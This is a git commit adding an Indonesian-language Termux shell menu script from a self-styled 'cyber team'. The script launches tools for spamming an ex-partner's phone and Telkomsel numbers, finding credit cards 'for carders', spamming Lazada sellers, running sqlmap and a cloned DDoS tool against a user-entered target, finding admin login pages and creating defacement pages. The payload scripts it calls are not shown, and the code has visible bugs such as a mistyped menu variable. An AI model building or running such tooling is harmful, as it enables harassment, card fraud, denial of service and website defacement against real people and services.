1bf677f6074042638c45adba016b8883790cde0f
usertersakiti31 <42396277+usertersakiti31@users.noreply.github.com>
2018-08-25 20:15:44 +0200

    BCT.sh

---
+++ BCT.sh
@@ -0,0 +1,179 @@
+#!/system/xbin/bash
+clear
+toilet -f slant --gay "[+] BCT-V2 [+]"
+sleep 2
+echo "\033[33;1m# Author:./WhiteSystem404"
+sleep 1
+echo "\033[34;1m# Contack:dedidarmadi745@gmail.com"
+sleep 1
+echo "\033[33;1m# Thanks To: Member Banyumas Cyber Team"
+sleep 3
+echo "\033[38;1m[+] Tools Yang Tersedia [+]"
+echo "[(1} SPAM MANTAN ]"
+echo "[(2} SPAM TELKOMSEL ]"
+echo "[(3} Pencari cc buat para carder Wibu ]"
+echo "[(4} Sql Scan ]"
+echo "[(5} Spam Seller Via Lazada]"
+echo "[(6} Mempercepat/menstabilkan Jaringan ]"
+echo "[(7} Install Sqlmap ]"
+echo "[(8} Dengerin lagu di Termux ]"
+echo "[(9} Install Lite DDOS ]"
+echo "[(10} Admin Login Finder ]"
+echo "[(11} Install Notepad For Linux ]"
+echo "[(12} Scrip Deface Creator ]"
+echo "(999). Info"
+echo "(00) OUT"
+echo "\033[38;1m Pilih salah satu ===××>"
+read mmrm
+if [ $mmrm = 01 ] || [ $mmrm = 1 ]
+then
+clear
+echo "\033[32;1m"
+figlet "[+] SPAM MANTAN [+]"
+php 1.php
+fi
+
+if
+[ $mmrm = 02 ] || [ $mmrm = 2 ]
+then
+clear
+echo "\033[37;1m"
+toilet "[+] SPAM TELKOMSEL [+]"
+php 2.php
+fi
+
+if [ $mmrm = 03 ] || [ $mmrm = 3 ]
+then
+clear
+toilet -f mono12 -F gay "[+] CARDER [+]"
+figlet "Banyumas Cyber Team"
+php 3.php
+fi
+
+
+if [ $mmrm = 04 ] || [ $mmrm = 4 ]
+then
+clear
+toilet -f mono12 -F gay "Sql Scan"
+echo "\033[33;1m"
+php 4.php
+fi
+
+if [ $mmrm = 05 ] || [ $mmrm = 5 ]
+then
+clear
+toilet -f mono12 -F gay "Lazada"
+echo "\033[33;1m"
+python2 5.py
+fi
+
+
+if [ $mmrm = 06 ] || [ $mmrm = 6 ]
+then
+clear
+figlet "Banyumas Cyber Team" | lolcat
+sleep 1
+echo "\033[34;1m---------------------| Mempercepat Jaringan |--------------------------"
+sleep 1
+echo "\033[34;1m+++++++++++++++++++++| By ./WhiteSystem404 |++++++++++++++++++++++++"
+sleep 1
+echo ""
+echo ""
+ping 8.8.8.8 
+fi
+
+if [ $mmrm = 07 ] || [ $mmrm = 7 ]
+then
+clear
+echo "\033[36;1m[+]Banyumas Cyber Team[+]"
+apt update
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+mv sqlmap $HOME
+cd $HOME/sqlmap
+read -p "masukan web target:" target
+python2 sqlmap.py -D target
+fi
+
+if [ $mmrm = 08] || [ $mmrm = 8 ]
+then
+clear
+cowsay -f kiss.cow "Banyumas Cyber Team" | lolcat
+figlet "./White System404" | lolcat
+sleep 2
+apt update && apt upgrade
+apt install pip
+pkg install python
+pkg install python2
+pip install mps_youtube
+pip install youtube_dl
+pkg install mpv
+mpsyt
+fi
+
+if [ $mmrm = 09 ] || [ $mmrm = 9 ]
+then
+clear
+toilet -f standard -F gay "Banyumas Cyber Team" 
+sleep 3
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $mmrm = 010 ] || [ $mmrm = 10 ]
+then
+clear
+toilet "./WhiteSystem404"
+python2 6.py
+fi
+
+if [ $mmrm = 011 ] || [ $mmrm = 011 ]
+then
+clear
+toilet -f big -F gay "BCT V2"
+sleep 1
+apt update 
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/cyweb/notefast
+mv notefast $HOME
+cd $HOME/notefast
+python2 setup.py
+fi
+
+if [ $mmrm = 012 ] || [ $mmrm = 012 ]
+then
+clear
+toilet "Banyumas Cyber Team"
+python2 7.py
+fi
+
+if
+[ $mrrm = 0999 ] || [ $mrrm = 999 ]
+then
+clear
+toilet -f slant --gay "[+] Tools BCT [+]"
+echo "\033[36;1mAuthor : ./WhiteSystem404"
+sleep 1
+echo "\033[35;1m Thanks To: Fahri A.R,Bebelack,Ixsan,Gay Anon,Lala Ceper"
+echo "\033[38;1m Mr.Angger,Mr.Botline,./BlackSystem,Black Death,White Death and My Friends"
+sleep 2
+echo "\033[30;1m tunggu 4 detik"
+sleep 4
+fi
+
+if
+[ $mrrm = 000 ] || [ $mrrm = 00 ]
+then
+echo "\033[31;1m Keluar"
+sleep 1
+echo "\033[32;1m Sampai berjumpa lagi and jangan lupa bahagia"
+sleep 1
+fi
+
